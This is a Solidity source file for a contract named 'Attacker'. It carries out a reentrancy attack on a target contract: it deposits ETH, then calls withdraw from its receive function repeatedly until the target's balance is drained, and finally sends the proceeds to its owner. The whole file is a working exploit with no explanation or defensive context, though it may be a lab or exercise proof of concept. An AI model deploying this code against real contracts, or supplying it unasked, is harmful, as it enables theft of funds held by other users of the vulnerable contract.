// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IVuln {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

contract Attacker {
    IVuln public target;
    address public owner;

    constructor(address _target) {
        target = IVuln(_target);
        owner = msg.sender;
    }

    // start by depositing then calling withdraw to trigger reentrancy
    function attack() external payable {
        require(msg.value > 0, "need ETH");
        target.deposit{value: msg.value}();
        target.withdraw(msg.value);
    }

    receive() external payable {
        uint256 bal = address(target).balance;
        if (bal > 0) {
            uint256 amt = msg.value > bal ? bal : msg.value;
            if (amt > 0) {
                // attempt to withdraw again
                target.withdraw(amt);
            }
        }
    }

    function collect() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }
}
